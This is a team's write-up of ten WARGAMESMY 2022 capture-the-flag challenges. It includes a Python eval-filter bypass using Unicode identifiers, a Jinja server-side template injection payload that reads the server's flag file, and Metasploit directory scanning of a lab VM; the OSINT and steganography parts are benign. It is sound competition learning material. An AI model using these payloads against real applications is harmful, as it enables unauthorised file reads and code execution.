# Unsafe Penetrators @ WARGAMESMY 2022

This is a post-mortem documentation for the questions and solutions during WARGAMESMY 2022


1. [Secure Dream 1.0](#Secure-Dream-10-Misc-)
2. [Secure Dream 2.0](#Secure-Dream-10-Misc-)
3. [Pxrtxblx Nxtwxrk Grxphxcs](#Pxrtxblx-Nxtwxrk-Grxphxcs-Misc-)
4. [Where Am I](#Where-Am-I-OSINT-)
5. [Who Am I](#Who-Am-I-OSINT-)
6. [When Am I](#When-Am-I-OSINT-)
7. [Christmas Wishlist](#Christmas-Wishlist-Web-)
8. [D00raemon (User)](#D00raemon-User-Boot2root-)
9. [Color](#Color-Steganography-)
10. [Puzzle](#Puzzle-Steganography-)


## Secure Dream 1.0 `Misc` <a name="secdreamone"></a>
![alt sec dream](https://i.imgur.com/ij8jHLO.png)

Upon extracting the zip, it gave us the following file structure.

![struc](https://i.imgur.com/2mEqwze.png)

Looks like the server source code, and my guess is that they run the exact same code in the remote server at `securedream.wargames.my:50255`.

The server code is shown below:
```python=
#!/usr/bin/env python3
# server.py

print('''\033[94m
♡ ☆ .♡‧₊˚
╭◜◝ ͡ ◜◝╮  ㅤ ╭◜◝ ͡ ◜◝╮.
(             )  ♡   (             )☆ ♡
╰◟◞ ͜ ◟◞╭◜◝ ͡ ◜◝╮ ͜ ◟◞╯♡
. ☆  ㅤㅤ(                )☆ ♡
♡ 　      ╰◟◞ ͜ ◟◞╯ . ☆

        [Secure Dream v1.0]
\033[0m''')

payload = input("What is your dream in life?\n")
if any(filter(lambda c: c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"\'', payload)):
        print("\nA𝒘𝒘... W𝒆 𝒅𝒐𝒏'𝒕 𝒖𝒏𝒅𝒆𝒓𝒔𝒕𝒂𝒏𝒅 𝒚𝒐𝒖𝒓 𝒅𝒓𝒆𝒂𝒎 :(")
else:
        eval(payload)
```
The server receives user input via `input()` function and does a filter check. It calls `eval()` - a function that executes python code as string when the input does not have any ascii characters and quotes.

Our goal here is to obtain the flag in `flag.txt`, which can be done by making the `eval()` function run our input.

We thought of inputting `print(open("flag.txt").read())` to get its contents. Lets try: 

![try](https://i.imgur.com/Cabg8aS.png)

As expected, it got rejected because there are ascii characters in our input.

We did some refactoring to remove the quotes, so it becomes
`print(chr(chr(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
)).read())`

Upon closer research, we found out that python actually supports unicode characters as a part of their source code.

So technically, <br>
`print(open("flag.txt").read())` can be translated into <br> `print(open(str(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))).read())` which in Unicode will become <br>
`𝒑𝒓𝒊𝒏𝒕(𝒐𝒑𝒆𝒏(𝒔𝒕𝒓(𝒄𝒉𝒓(102)+𝒄𝒉𝒓(108)+𝒄𝒉𝒓(97)+𝒄𝒉𝒓(103)+𝒄𝒉𝒓(46)+𝒄𝒉𝒓(116)+𝒄𝒉𝒓(120)+𝒄𝒉𝒓(116)
)).𝒓𝒆𝒂𝒅())`

We submitted the latter and we get the following result:
![alttext](https://i.imgur.com/EuZOfW2.png)
The flag is `wgmy{ab065d1d896dcdc228d5f19077501838}`



## Secure Dream 2.0 `Misc` <a name="secdreamtwo"></a>
![secd2](https://i.imgur.com/EcCijKm.png)
Similar to above situation, expect with a small twist ~
The server updated its source code to this:
```python=
#!/usr/bin/env python3
# server.py
print('''\033[94m
♡ ☆ .♡‧₊˚
╭◜◝ ͡ ◜◝╮  ㅤ ╭◜◝ ͡ ◜◝╮.
(             )  ♡   (             )☆ ♡
╰◟◞ ͜ ◟◞╭◜◝ ͡ ◜◝╮ ͜ ◟◞╯♡
. ☆  ㅤㅤ(                )☆ ♡
♡ 　      ╰◟◞ ͜ ◟◞╯ . ☆

        [Secure Dream v2.0]
\033[0m''')

payload = input("What is your dream in life?\n")
# More secure?
if any(filter(lambda c: c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"\'+', payload)):
        print("\nA𝒘𝒘... W𝒆 𝒅𝒐𝒏'𝒕 𝒖𝒏𝒅𝒆𝒓𝒔𝒕𝒂𝒏𝒅 𝒚𝒐𝒖𝒓 𝒅𝒓𝒆𝒂𝒎 :(")
else:
        eval(payload)
```

Now, the `+` character is forbidden. 
We changed our payload to `𝒑𝒓𝒊𝒏𝒕(𝒐𝒑𝒆𝒏(𝒔𝒕𝒓().𝒋𝒐𝒊𝒏([𝒄𝒉𝒓(102),𝒄𝒉𝒓(108),𝒄𝒉𝒓(97),𝒄𝒉𝒓(103),𝒄𝒉𝒓(46),𝒄𝒉𝒓(116),𝒄𝒉𝒓(120),𝒄𝒉𝒓(116)])).𝒓𝒆𝒂𝒅())` and it works.

![res](https://i.imgur.com/9JyJtlI.png)
`wgmy{2d2c3bd7230a9c3d0aed87dc62ccf2e4}` is the flag


## Pxrtxblx Nxtwxrk Grxphxcs `Misc` <a name="png"></a>
![png](https://i.imgur.com/t0TN3pY.png)
We downloaded and extracted a zip, it gave us a file named `chal.png`.

We tried to view it, but it gave us an error
![badpng](https://i.imgur.com/YAwnI1M.png)

This message means that the file signature (the first few bytes to specify what type of file is missing) is wrong.

The signature for png file should be `89 50 4e 47 0d 0a 1a 0a`

The signature of the `chal.png` file are as follows.
![badheader](https://i.imgur.com/ulWMyWN.png)

After the rectification of signature, we tried again and see this
![crcerr](https://i.imgur.com/YtXVTa3.png)

We did some [research](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) and found out that a CRC of a PNG is a calculation of its metadata like width, height, color format etc into 4 bytes to ensure secure transmission. 

We did a `pngcheck` to know more about the issue and we get this:
```
chal_1.png  CRC error in chunk IHDR (computed 9a825356, expected 72fac564)
ERROR: chal_1.png
```

The CRC is indeed cauculated wrongly. We are not sure what to do at this point because there are 2 possible ways to rectify this.

1. Modify the metadata to make the crc match 
2. recalculate the crc to match the metadata

So, we decided to run a `file` against the png to summarize its metadata : 
```
>file chal_1.png
chal_1.png: PNG image data, 57005 x 48879, 8-bit colormap, non-interlaced
```

WTF , 57005 x 48879 px big and the file is only 2kb.. We are sure we need to change the metadata to fix this.

Here is a sample of a PNG header to get a feel of its strucutre
```
89504E47  // PNG Signature
0D0A1A0A

0000000D  // byte length of IHDR chunk contents, 4 bytes, value 13
49484452  // IHDR start - 4 bytes
00000004  // Width                        4 bytes }
00000001  // Height                       4 bytes }
08        // bit depth 8 = 24/32 bit      1 byte  }
06        // color type, 6 - RGBa         1 byte  }
00        // compression, 0 = Deflate     1 byte  }
00        // filter, 0 = no filter        1 byte  }
00        // interlace, 0 = no interlace  1 byte  } Total, 13 Bytes
F93C0FCD  // CRC of IHDR chunk, 4 bytes         
```

And to compare it with our `chal.png`..
![hexchal](https://i.imgur.com/XZWuime.png)
It looks like the 4 bytes of width `00 00 DE AD` and our four bytes of height `00 00 BE EF` matches the absurd dimension metadata (57005 x 48879). Our next step will be figuring out the correct value to replace these hex values.

The CRC is cauculated using [this](https://en.wikipedia.org/wiki/Computation_of_cyclic_redundancy_checks) method, or to put it simply,
`x32 + x26 + x23 + x22 + x16 + x12 + x11 + x10 + x8 + x7 + x5 + x4 + x2 + x + 1`
where the 32-bit CRC is initialized to all 1's, and then the data from each byte is processed from the least significant bit (1) to the most significant bit (128). After all the data bytes are processed, the CRC is inverted (its ones complement is taken). This value is transmitted (stored in the datastream) MSB first. For the purpose of separating into bytes and ordering, the least significant bit of the 32-bit CRC is defined to be the coefficient of the x31 term. [More explanation here btw](https://www.w3.org/TR/png/#5CRC-algorithm)

I didnt have time to study the math during the competition, so i figured that it is possible to brute-force the values giving that we only have `3900 * 3900 = 9800000` possibilities wherer `4000 x 4000` is the maximum size and `100 x 100` is the minimum.

The python script below executes the brute-force, using the `pwn.pwn32` module to help convert decimal numbers to hex bytes and the `zlib.crc32` module to calculate the CRC

```python=
from pwn import p32
from zlib import crc32


required_crc = 0x72FAC564
max_dimension = 4000

for width in range(100, max_dimension):
    for height in range(100, max_dimension):
        ihdr = b'\x49\x48\x44\x52' + p32(width, endian='big') + p32(height, endian='big') + b'\x08\x03\x00\x00\x00' # the rest of the ihdr bytes

        if height % 100 == 0:
            print('ihdr:', ihdr.hex())

        crc = crc32(ihdr)
        if crc == required_crc:
            print('FOUND!')
            print(width, height)
            exit()
print("no found")
```

After running this script for around 5 mins, the output is 
`1013 x 958`. I changed the values inside the file itself and tried to open the image again and sure enough:

![yaypng](https://i.imgur.com/4AG2p8u.png)

The flag is at the blue section at the right leg of 'M', and can be eyeballed.
`wgmy{e6fb725a5b2e25429442dbd568ce058e}`

## Where Am I `OSINT`  <a name="whereami"></a>
![whererami](https://i.imgur.com/9VGgkV1.png)

Upon extracting the challenge zip, we obtained this image.
![texas](https://i.imgur.com/X9mMNRj.png)

We opened this images in a text editor and there was nothing weird inside it, since this challenge is an Open Soruce Intellegence gathering challenge, we need to find out more information about this image online.

The location of this image seems to be the key from the question, so we went and look for texas chicken branches in malaysia

![texas good](https://i.imgur.com/0a9gNob.png)

Theres alot of branches, so we need to find more clues in the image to help us narrow down the search.

We noticed that there is a beard papas store beside texas chicken, so we went and see which shopping mall these two have in common.

We found there is a branch in Mid Valley and it looks identical to the one in the challenge picture 
![bp](https://i.imgur.com/vvmVqpD.png)

We immidiately went google for that branch and we found the picture source in google maps
![foundwhere](https://i.imgur.com/QNgwOJ0.png)

The flag is included in the title of the review
`wgmy{7a75a532aaab234ad4bd33ed67e67242}`


## Who Am I `OSINT`  <a name="whoami"></a>

![whoami](https://i.imgur.com/LBx6f9A.png)

Upon extracting the zip, we are given this image.
![whoamiimg](https://i.imgur.com/xJm5JgE.png)

This is the promotional poster from their social media, the original image is as follows:-

![ogwhoami](https://scontent-kut2-1.xx.fbcdn.net/v/t39.30808-6/320949467_2700592496744033_3351081919747587694_n.jpg?_nc_cat=110&ccb=1-7&_nc_sid=730e14&_nc_ohc=0NKgGyngiOsAX9juyqA&_nc_ht=scontent-kut2-1.xx&oh=00_AfAm8GucNaPRQ-Y4SyebjDLqhQRxXR6DQ3YsK5b7rH7JMg&oe=63B02FC9)

There are winding text on the right and side of the image, we translated the text into the flag.

## When Am I `OSINT`  <a name="whenami"></a>

![whenami](https://i.imgur.com/qJI26bJ.png)

After extracting the zip, we are given this image
![whenamiimg](https://i.imgur.com/cniq5Gj.png)

This image is a agenda poster for the ComicFiesta event in Malaysia. After searching on their official website, we managed to recover the unsmudged [image](https://www.comicfiesta.org/schedule).

The smudged text have 'hololive' in both of them, we googled 'time hololive' for clues and found [Ouro Kronii](https://virtualyoutuber.fandom.com/wiki/Ouro_Kronii).

We also noticed the hangman-like puzzle at the bottom of the day 2 schedule and it fits with the clue we just obtained.

We uploaded our image to [aperisolve](https://www.aperisolve.com) with OUROKRONII as the steghide password and the following string gets extracted

```

Among Us - 1:36:18


[Viewer Rules]


3:6:4
4:7:8
1:5:1
2:3:5
"{"
6:6:4
7:6:2
10:4:1
9:1:1
8:3:2
9:5:1
8:1:1
8:1:1
"0"
4:1:1
8:1:1
11:1:1
12:5:1
6:1:1
7:1:1
"0"
6:1:1
8:1:1
4:5:3
"0"
6:12:3
10:1:1
7:2:6
4:11:1
5:2:2
12:3:1
7:1:1
3:1:1
10:5:4
10:27:2
11:3:2
11:6:4
"}"
```

We completely dismissed the among us part and we looked up on the viewer rules of ouro kronii and found in [wiki](https://hololive.wiki/wiki/Ouro_Kronii)

```

Thank you for watching my stream!
To help everyone enjoy the stream more, please follow these rules:
1.Be nice to other viewers. Don’t spam or troll.
2.If you see spam or trolling, don’t respond. Just block, report, and ignore those comments.
3.Talk about the stream, but please don’t bring up unrelated topics or have personal conversations.
4.Don’t bring up other streamers or streams unless I mention them.
5.Similarly, don’t talk about me or my stream in other streamers’ chat.
6.No backseating unless I ask for help. I'd rather learn from my mistakes by dying countless times; if I fail, it will be on my own terms.
7.Please refrain from chatting before the stream starts to prevent any issues.
8.I will be reading some superchats that may catch my attention during the game but most of the reading will be done at the end of stream.
9.Please refrain from making voice requests as they were most likely done already.
As long as you follow the rules above, you can chat in any language!
```

After some time, we figured that the `answer.txt` above is a book cipher for the flag. So we made a python script that generates the flag for us:-

``` python=
# open file answer
# populate answer lines
answer = open("answer_trim.txt", "r")
answer_lines = answer.readlines()

# open file viewrules
viewrules = open("viewrules", "r")
viewrules_lines = viewrules.readlines()

# trim lines
answer_lines = [ans.strip() for ans in answer_lines]

# declare res
res = ""

# loop thru every elem in answer_lines
for answer in answer_lines:
        print(answer)
        # try to split answer with colon
        split_ans = answer.split(":")
        # if the length is 1, just add to res and continue
        if len(split_ans) == 1:
                res += split_ans[0]
                continue
        # else do the process
        # get line to be process
        line_num = int(split_ans[0]) - 1
        word_num = int(split_ans[1]) - 1
        char_num = int(split_ans[2]) - 1

        line = viewrules_lines[line_num]
        words = line.split(" ")
        word = words[word_num]
        char = word[char_num]
        res += str(char)
    print(res)
```
After running the script, we obtained the flag `wgmy{eeb7ac660269f45046a0e8abaa51dfec}`


## Christmas Wishlist `Web` <a name="christmaswishlist"></a>
Upon extracting the zip given, we were aware that the folder contained the files that were used to run the app on the website. Upon inspecting the files, it seems like the only important file is the `/app/app.py` file.

It contains the code to a flask server running Python. When inspecting the code further, we realized that it was using `render_template_string`, which could be an attack vector. This attack was what we later know as `Server-Side Template Injection`.

The first attempt was to trigger it to load an HTML tag. If this works, that means we can inject other types of code into the webapp.

We uploaded a file with the following line:
```html
<h1>Hello there</h1>
```
Sure enough, it was rendered on the screen! That means that the application is rendering the raw text passed in. Perfect!
<img src="https://i.imgur.com/KfseoKy.png" alt="html" style="width:600px;"/>

All we had to do now was to actually extract the file. We first tried to see if we can run some code on it. We created a new file with only the text `{{ config }}` inside. Uploading this file yield the results below:
<img src="https://i.imgur.com/Y6iRzC0.png" alt="command" style="width:600px;"/>

Wonderful! That means two things:
1. We can try to run some code to extract the flag file
2. We can use Jinja templating language

All we had to do now was to just write a simple command to extract and read the file!
```
{{ request['application']['__globals__']['__builtins__']['open']('/flag')['read']() }}
```
Uploading this file will cause the program to open a file named `flag` at the root directory and read it! The program will then output the flag!
<img src="https://i.imgur.com/9EEb9fJ.png" alt="output" style="width:600px;"/>

## D00raemon (User) `Boot2root` <a name="d00raemon"></a>
We first had to go to a [TryHackMe link](https://tryhackme.com/room/wgmy2022easy1) to spin up the VM that contains the flag. 
Once the VM was booted up completely, navigating to the IP address showed an Apache Ubuntu page.
If you navigate to a random URL (such as `http://<VM_IP>/asjdhajsd`), it shows the error page containing information about the Apache version.

<img src="https://i.imgur.com/WmG0s28.png" alt="not found" style="width:400px;"/>

The Apache version used is `2.4.41`. Directory traversal exploits were only on version `2.4.49`, that means we had to use other methods to exploit this server. 

We then looked to using Metasplot and see if the server has any other applications running at port 80. We used the `dir_scanner` command to find any interesting directories worth exploring.
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <VM_IP>
run
```
Bingo! We found a Wordpress app running on this server (indicated by the `/wordpress` directory)!
<img src="https://i.imgur.com/K68ZwD6.png" alt="metasploit" style="width:400px;"/>

If you're at all aware of how wordpress works, they usually have a publicly accessible folder where all wordpress content is stored. This is usually at `http://<VM_IP>/wp-content/uploads`. 

However, upon going to that directory, it was not found... :thinking_face: 
We then tried appending that path after `/wordpress` since Metasploit didn't pick up that directory initially, and boom! Navigating to `http://<VM_IP>/wordpress/wp-content/uploads` showed us a folder!

<img src="https://i.imgur.com/lclX52K.png" alt="wp content" style="width:400px;"/>

All we had to do is just navigate all the way down to the last file at `/wordpress/wp-content/uploads/2022/12/notes.txt` to retrieve the password to the VM!

Finally, we just had to ssh as user to the VM, and run `cat user.txt` to get the flag!
<img src="https://i.imgur.com/Nu8QsOr.png" alt="final output" style="width:400px;"/>

## Color `Steganography` <a name="color"></a>
<img src="https://i.imgur.com/k5C0vty.png" alt="qrcode" style="width:200px;"/>
We downloaded and extracted the challenge zip, which gave us a QR code that looked like the above. From here, it was obvious that the colors would combine to represent a QR code. However, at first glance, we thought that maybe the colors have to be matched in a specific combination.

This proved rather unnecessary as we could just load the photo into Photoshop (or any other image editing tool) and change the color channels to only red, green, or blue. This gave us three separate QR codes that hold parts of the flag. Upon scanning all of them, we just combined the output to retrieve the final flag!

<img src="https://i.imgur.com/FCOaZMD.jpg" alt="qrcode" style="width:600px;"/>


## Puzzle `Steganography` <a name="puzzle"></a>
<img src="https://i.imgur.com/GX3l0pp.jpg" alt="drawing" style="width:200px;"/>

We downloaded and extracted a zip, the file. Inside it was just one insanely large image of Mona Lisa weighing 94.3MB! At first we thought that the image might contain hidden files inside it. 

However upon inspecting it with different tools such as `binwalk`, we were unable to discover hidden material. Everything led to us to think that this was a legitimate image.

After that we got curious, and did what we should've done as soon as we first opened the image, actually inspect it! If you zoom in to the top of the image, you'll discover certain elements that look like pieces of a QR code.

In order to extract the qr code from the image, we had to find the original image. We scavenged the internet and found the same image that was used weighing 94.3MB.

We loaded up photoshop and by following a few steps [here](https://photo.stackexchange.com/questions/11735/how-can-i-tell-exactly-what-changed-between-two-images). Managed to find the difference between the original and modified images. 

<img src="https://i.imgur.com/jKEEJVq.png" alt="drawing" style="width:200px;"/>

There was no choice but to cut out all these pieces and slowly "puzzle" them together. After doing that and scanning the QR, it magically gaves the code!

## The Team
<img src="https://i.imgur.com/uiqIjXm.png" alt="score" style="width:600px;"/>
<img src="https://i.imgur.com/Mz0k733.png" alt="graph" style="width:600px;"/>

- [Eason Chai](https://github.com/easonchai)
- Bunyodbek Shamsiddinov
- [Jun Han Ng](https://github.com/neosizzle)